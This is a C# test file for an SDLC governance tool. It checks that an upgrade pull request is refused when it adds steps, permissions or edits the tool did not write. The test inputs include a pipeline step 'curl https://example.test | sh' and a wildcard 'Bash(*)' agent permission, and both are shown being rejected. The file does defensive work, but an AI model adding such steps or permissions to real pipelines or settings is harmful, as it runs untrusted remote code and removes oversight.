using System.Text.Json.Nodes;
using FluentResults;
using Microsoft.Extensions.DependencyInjection;
using Sdlc.Core;
using Sdlc.Core.Chain;
using Sdlc.Core.Cycles;
using Sdlc.Core.Factory;
using Sdlc.Core.Git;
using Sdlc.Core.Init;
using Sdlc.Core.Solutions;

namespace Sdlc.Tests;

/// <summary>
/// A pull request that moves the release and nothing else merges without a cycle, because the check reproduces it
/// (D-133).
/// </summary>
/// <remarks>
/// The properties worth holding are the refusals: a branch name buys nothing, one file adoption did not write and
/// it is an ungoverned change again, and the declared stack may be answered but never changed.
/// </remarks>
[TestClass]
public sealed class UpgradeTests
{
    private const string Divergence = "0123456789abcdef0123456789abcdef01234567";
    private const string Older = "0.1.0";

    /// <summary>The test context, for the cancellation token the analysers require to be passed on.</summary>
    public TestContext TestContext { get; set; } = null!;

    [TestMethod]
    public void Only_the_pin_what_adoption_owns_and_the_stack_are_an_upgrade()
    {
        Assert.IsTrue(VerifyUpgrade.Carries([".config/dotnet-tools.json", ".sdlc/README.md", ".claude/settings.json"]));
        Assert.IsTrue(VerifyUpgrade.Carries([".github\\workflows\\sdlc-verify.yml", ".sdlc/techstack.md"]));

        Assert.IsFalse(VerifyUpgrade.Carries([".config/dotnet-tools.json", "src/App/Program.cs"]), "One source file and it is not an upgrade.");
        Assert.IsFalse(VerifyUpgrade.Carries([".sdlc/constraints.md"]), "A file only a person writes, and not the stack, is a cycle's.");
        Assert.IsFalse(VerifyUpgrade.Carries([]), "An empty diff upgrades nothing.");
    }

    [TestMethod]
    public void Every_file_adoption_writes_in_a_governed_solution_is_one_an_upgrade_may_change()
    {
        // Adoption owns its files by writing them; the upgrade check names them. This holds the two lists together.
        foreach (Platform platform in (Platform[])[Platform.GitHub, Platform.AzureDevOps])
        {
            using var solution = Adopted.Create(TestContext, platform);

            foreach (string written in solution.Written)
            {
                string path = written.Replace('\\', '/');

                if (path is Initialise.AgentsFileName or ".gitattributes")
                {
                    // Written only where there is none, which a governed solution already has.
                    continue;
                }

                CollectionAssert.Contains(VerifyUpgrade.Paths.ToList(), path, platform + " adoption writes it.");
            }
        }
    }

    [TestMethod]
    public async Task Moving_the_pin_and_running_adoption_holds()
    {
        using var solution = Adopted.Create(TestContext);
        FakeRepository git = solution.AsOlderRelease();

        IReadOnlyList<string> changed = solution.Upgrade();

        VerifyUpgrade.Response verdict = await Check(solution, git, changed);

        Assert.IsTrue(verdict.Holds, VerifyUpgrade.Render(verdict));
        Assert.AreEqual(Older, verdict.From);
        Assert.AreEqual(Release.Version, verdict.To);
        CollectionAssert.Contains(changed.ToList(), PinnedRelease.ManifestPath);
    }

    [TestMethod]
    public async Task A_teams_own_settings_are_kept_and_a_new_one_is_refused()
    {
        using var solution = Adopted.Create(TestContext);

        // Their own permission was there before the upgrade, so adoption keeps it and the check agrees.
        solution.Edit(".claude/settings.json", text => WithPermission(text, "Bash(dotnet build)"));
        FakeRepository git = solution.AsOlderRelease();
        IReadOnlyList<string> changed = solution.Upgrade();

        Assert.IsTrue((await Check(solution, git, changed)).Holds);

        // One added in the upgrade's pull request is a change of the team's own, which is a cycle's.
        solution.Edit(".claude/settings.json", text => WithPermission(text, "Bash(*)"));

        VerifyUpgrade.Response verdict = await Check(solution, git, [.. changed, ".claude/settings.json"]);

        Assert.IsFalse(verdict.Holds);
        StringAssert.Contains(VerifyUpgrade.Render(verdict), "[no]  .claude/settings.json is what adoption writes");
    }

    [TestMethod]
    public async Task A_hand_edit_to_the_pipeline_is_refused()
    {
        using var solution = Adopted.Create(TestContext);
        FakeRepository git = solution.AsOlderRelease();
        IReadOnlyList<string> changed = solution.Upgrade();

        solution.Edit(".github/workflows/sdlc-verify.yml", text => text + "      - run: echo skipped\n");

        VerifyUpgrade.Response verdict = await Check(solution, git, [.. changed, ".github/workflows/sdlc-verify.yml"]);

        Assert.IsFalse(verdict.Holds, VerifyUpgrade.Render(verdict));
    }

    [TestMethod]
    public async Task Anything_else_in_the_pull_request_is_refused()
    {
        using var solution = Adopted.Create(TestContext);
        FakeRepository git = solution.AsOlderRelease();
        IReadOnlyList<string> changed = solution.Upgrade();

        VerifyUpgrade.Response verdict = await Check(solution, git, [.. changed, "src/App/Program.cs"]);

        Assert.IsFalse(verdict.Holds);
        Assert.IsFalse(verdict.Checks.Single(check => check.Name == "this pull request carries only an upgrade").Passed);
    }

    [TestMethod]
    public void The_factorys_pipeline_is_one_an_upgrade_may_change()
    {
        Assert.IsTrue(VerifyUpgrade.Carries([".config/dotnet-tools.json", "azure-pipelines.factory.yml"]));
        Assert.IsTrue(VerifyUpgrade.Carries([".github/workflows/sdlc-factory.yml"]));
    }

    [TestMethod]
    public void The_cycles_ignore_file_may_gain_what_opening_a_cycle_appends_and_nothing_else()
    {
        Assert.IsTrue(VerifyUpgrade.Carries([".sdlc/cycles/.gitignore", ".sdlc/techstack.md"]));

        // An older release's file: every block but the last.
        string whole = NewCycle.IgnoreFile(null);
        string existing = whole[..whole.IndexOf("# The change itself", StringComparison.Ordinal)].TrimEnd() + Environment.NewLine;

        Assert.AreEqual(whole.ReplaceLineEndings("\n"), NewCycle.IgnoreFile(existing).ReplaceLineEndings("\n"), "Topped up, it is the whole file.");

        Result<string> expected = VerifyUpgrade.Expected(NewCycle.IgnorePath, existing, null, null);

        Assert.IsTrue(VerifyUpgrade.Written(NewCycle.IgnorePath, expected, NewCycle.IgnoreFile(existing)).Passed);
        Assert.IsFalse(VerifyUpgrade.Written(NewCycle.IgnorePath, expected, NewCycle.IgnoreFile(existing) + "src/\n").Passed, "A team's own pattern is a cycle's.");
    }

    [TestMethod]
    public void A_teams_own_steps_and_pool_are_carried_through_an_upgrade()
    {
        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
        string theirs = Customised(template);

        // The base is an older release's pipeline with the same additions; the head is this release's with them.
        string existing = Customised(template.Replace("displayName: install sdlc", "displayName: install the gate", StringComparison.Ordinal));

        VerifyChain.ChainCheck check = VerifyUpgrade.Shaped("azure-pipelines.yml", template, existing, theirs);

        Assert.IsTrue(check.Passed, check.Detail);
        StringAssert.Contains(check.Detail, "2 of the team's own");
    }

    [TestMethod]
    public void Comments_are_not_compared()
    {
        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
        string head = template.Replace("# The guarantee.", "# Ours, reworded.", StringComparison.Ordinal);

        Assert.AreNotEqual(template, head, "The test needs the comment to move.");
        Assert.IsTrue(VerifyUpgrade.Shaped("azure-pipelines.yml", template, template, head).Passed);
    }

    [TestMethod]
    public void A_step_the_base_did_not_have_is_refused()
    {
        string template = Templates.Pipeline(Platform.AzureDevOps, "development");

        string head = template.ReplaceLineEndings("\n").Replace("  - script: dotnet test", "  - script: curl https://example.test | sh\n\n  - script: dotnet test", StringComparison.Ordinal);

        Assert.AreNotEqual(template.ReplaceLineEndings("\n"), head, "The test needs the step to land.");

        VerifyChain.ChainCheck check = VerifyUpgrade.Shaped("azure-pipelines.yml", template, template, head);

        Assert.IsFalse(check.Passed);
        StringAssert.Contains(check.Detail, "neither this release's nor one the base had");
    }

    [TestMethod]
    public void A_framework_step_missing_or_edited_is_refused()
    {
        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
        string theirs = Customised(template);

        string weakened = theirs.Replace("condition: and(succeeded(), eq(variables['Build.Reason'], 'PullRequest'))", "condition: false", StringComparison.Ordinal);
        string dropped = string.Join('\n', theirs.ReplaceLineEndings("\n").Split('\n').TakeWhile(line => !line.Contains("# The guarantee.", StringComparison.Ordinal)));

        Assert.AreNotEqual(theirs, weakened, "The test needs the condition to move.");
        Assert.IsFalse(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, weakened).Passed, "The chain's own step, switched off.");
        Assert.IsFalse(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, dropped).Passed, "The chain's own step, gone.");
    }

    [TestMethod]
    public void Outside_the_steps_it_is_the_bases_or_this_releases()
    {
        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
        string theirs = Customised(template);
        string moved = theirs.Replace("name: OurPool", "name: AnotherPool", StringComparison.Ordinal);

        Assert.IsTrue(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, template).Passed, "Back to what the release writes.");
        Assert.IsFalse(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, moved).Passed);
    }

    [TestMethod]
    public void The_factorys_pipeline_keeps_its_pool_and_sign_in_through_an_upgrade()
    {
        string template = FactoryPipeline.Text(Platform.AzureDevOps, "development");
        string theirs = template
            .ReplaceLineEndings("\n")
            .Replace("      vmImage: ubuntu-latest", "      name: OurFactory", StringComparison.Ordinal)
            .Replace("            - script: |\n                git switch", "            - task: NuGetAuthenticate@1\n\n            - script: |\n                git switch", StringComparison.Ordinal);

        Assert.AreNotEqual(template, theirs);
        StringAssert.Contains(theirs, "NuGetAuthenticate@1");

        VerifyChain.ChainCheck check = VerifyUpgrade.Shaped("azure-pipelines.factory.yml", template, theirs, theirs);

        Assert.IsTrue(check.Passed, check.Detail);
        StringAssert.Contains(check.Detail, "1 of the team's own");
    }

    [TestMethod]
    public void The_check_has_to_run_as_the_release_the_branch_pins()
    {
        Assert.IsFalse(VerifyUpgrade.Runs(Older, null).Passed, "No pin, nothing to reproduce.");
        Assert.IsFalse(VerifyUpgrade.Runs(Older, "999.0.0").Passed, "Another release's adoption is not this one's.");

        StringAssert.Contains(VerifyUpgrade.Runs(Older, Release.Version).Detail, "from " + Older);
        StringAssert.Contains(VerifyUpgrade.Runs("999.0.0", Release.Version).Detail, "rollback");
        StringAssert.Contains(VerifyUpgrade.Runs(Release.Version, Release.Version).Detail, "refresh");
    }

    [TestMethod]
    public void The_stack_may_answer_what_this_release_asks()
    {
        string head = Templates.TechStack();
        string existing = Without(Without(head, "| accessibility testing |"), "| `PRO_03` |");

        VerifyChain.ChainCheck check = VerifyUpgrade.Answered(existing, head);

        Assert.IsTrue(check.Passed, check.Detail);
        StringAssert.Contains(check.Detail, "PRO_03");
        StringAssert.Contains(check.Detail, "accessibility testing");
    }

    [TestMethod]
    public void A_no_is_an_answer_too()
    {
        string existing = Without(Templates.TechStack(), "| `PRO_03` |");
        string head = Templates.TechStack().Replace("| `PRO_03` | true |", "| `PRO_03` | false |", StringComparison.Ordinal);

        Assert.IsTrue(VerifyUpgrade.Answered(existing, head).Passed);
    }

    [TestMethod]
    public void An_answer_already_given_is_not_an_upgrades_to_change()
    {
        string existing = Templates.TechStack();
        string head = existing.Replace("| `PRO_02` | true |", "| `PRO_02` | false |", StringComparison.Ordinal);

        VerifyChain.ChainCheck check = VerifyUpgrade.Answered(existing, head);

        Assert.IsFalse(check.Passed);
        StringAssert.Contains(check.Detail, "PRO_02");
    }

    [TestMethod]
    public void A_row_this_release_does_not_ask_about_is_refused()
    {
        string existing = Templates.TechStack();
        string head = existing.Replace("| ORM | EF Core |", "| ORM | EF Core |\n| message bus | MassTransit |", StringComparison.Ordinal);

        Assert.AreNotEqual(existing, head, "The test needs the row to land.");
        Assert.IsFalse(VerifyUpgrade.Answered(existing, head).Passed);
    }

    [TestMethod]
    public void A_stack_placed_in_the_upgrade_is_a_first_declaration_and_refused()
    {
        Assert.IsFalse(VerifyUpgrade.Answered(null, Templates.TechStack()).Passed);
    }

    private static async Task<VerifyUpgrade.Response> Check(Adopted solution, FakeRepository git, IReadOnlyList<string> changed)
    {
        using var gate = Gate.For(solution.Root, services => services.AddSingleton<IRepository>(git));

        Result<VerifyUpgrade.Response> result = await gate
            .Send<VerifyUpgrade.Query, VerifyUpgrade.Response>(new VerifyUpgrade.Query(changed, Divergence));

        Assert.IsTrue(result.IsSuccess, string.Join("; ", result.Errors.Select(error => error.Message)));
        return result.Value;
    }

    private static string WithPermission(string settings, string permission)
    {
        JsonObject root = JsonNode.Parse(settings)!.AsObject();

        if (root["permissions"] is not JsonObject permissions)
        {
            permissions = [];
            root["permissions"] = permissions;
        }

        if (permissions["allow"] is not JsonArray allow)
        {
            allow = [];
            permissions["allow"] = allow;
        }

        allow.Add(permission);
        return root.ToJsonString(new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
    }

    // What a solution adds to the generated pipeline: its own pool, a feed sign-in, and a browser install.
    private static string Customised(string pipeline) => pipeline
        .ReplaceLineEndings("\n")
        .Replace("  vmImage: ubuntu-latest", "  name: OurPool", StringComparison.Ordinal)
        .Replace("  - script: |\n      [ -f .config", "  - task: NuGetAuthenticate@1\n\n  - script: |\n      [ -f .config", StringComparison.Ordinal)
        .Replace("  - script: dotnet test", "  - script: pwsh playwright.ps1 install --with-deps chromium\n    displayName: install the browsers\n\n  - script: dotnet test", StringComparison.Ordinal);

    private static string Without(string text, string lineStart) => string.Join(
        '\n',
        text.ReplaceLineEndings("\n").Split('\n').Where(line => !line.StartsWith(lineStart, StringComparison.Ordinal)));

    /// <summary>A scratch solution adoption wrote, with its document placed.</summary>
    private sealed class Adopted : IDisposable
    {
        private readonly TestContext context;
        private Dictionary<string, string?> before = [];

        private Adopted(string root, TestContext context, IReadOnlyList<string> written)
        {
            Root = root;
            this.context = context;
            Written = written;
        }

        public string Root { get; }

        public IReadOnlyList<string> Written { get; }

        public static Adopted Create(TestContext context, Platform platform = Platform.GitHub)
        {
            string root = Path.Combine(Path.GetTempPath(), "sdlc-upgrade-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(root);

            Initialise.Response report = Adopt(root, platform);

            string sdlc = Path.Combine(root, Cycle.SdlcDirectoryName);
            File.Move(Path.Combine(sdlc, WriteSolutionDraft.DraftFileName), Path.Combine(sdlc, Cycle.SolutionFileName));
            File.Move(Path.Combine(sdlc, WriteTechStackDraft.DraftFileName), Path.Combine(sdlc, Cycle.TechStackFileName));

            return new Adopted(root, context, report.Written);
        }

        /// <summary>Makes the working copy what an older release left, and returns git answering with it as the base.</summary>
        public FakeRepository AsOlderRelease()
        {
            File.WriteAllText(Full(PinnedRelease.ManifestPath), PinnedRelease.Pin(null, Older).Value);
            File.WriteAllText(Full(".sdlc/README.md"), "The framework's files, as an older release wrote them.\n");

            FakeRepository git = new();
            before = [];

            foreach (string path in VerifyUpgrade.Paths)
            {
                string? text = File.Exists(Full(path)) ? File.ReadAllText(Full(path)) : null;
                before[path] = text;

                if (text is not null)
                {
                    git.Files[Divergence + ":" + path] = text;
                }
            }

            return git;
        }

        /// <summary>Runs adoption again, as the upgrade does, and returns what it changed.</summary>
        public IReadOnlyList<string> Upgrade()
        {
            File.WriteAllText(Full(PinnedRelease.ManifestPath), PinnedRelease.Pin(File.ReadAllText(Full(PinnedRelease.ManifestPath)), Release.Version).Value);
            _ = Adopt(Root, platform: null);

            return
            [
                .. VerifyUpgrade.Paths.Where(path =>
                    !string.Equals(before.GetValueOrDefault(path), File.Exists(Full(path)) ? File.ReadAllText(Full(path)) : null, StringComparison.Ordinal)),
            ];
        }

        public void Edit(string path, Func<string, string> change) =>
            File.WriteAllText(Full(path), change(File.ReadAllText(Full(path))));

        public void Dispose()
        {
            try
            {
                Directory.Delete(Root, recursive: true);
            }
            catch (IOException)
            {
                // A scratch directory a virus scanner still has open. Nothing here depends on it going.
                context.WriteLine("left " + Root);
            }
        }

        private static Initialise.Response Adopt(string root, Platform? platform)
        {
            using var gate = Gate.For(root, services => services.AddSingleton<IRepository>(new FakeRepository()));

            Result<Initialise.Response> result = gate
                .Send<Initialise.Command, Initialise.Response>(new Initialise.Command(platform))
                .GetAwaiter()
                .GetResult();

            Assert.IsTrue(result.IsSuccess, string.Join("; ", result.Errors.Select(error => error.Message)));
            return result.Value;
        }

        private string Full(string path) => Path.Combine(Root, Path.Combine([.. path.Split('/')]));
    }
}
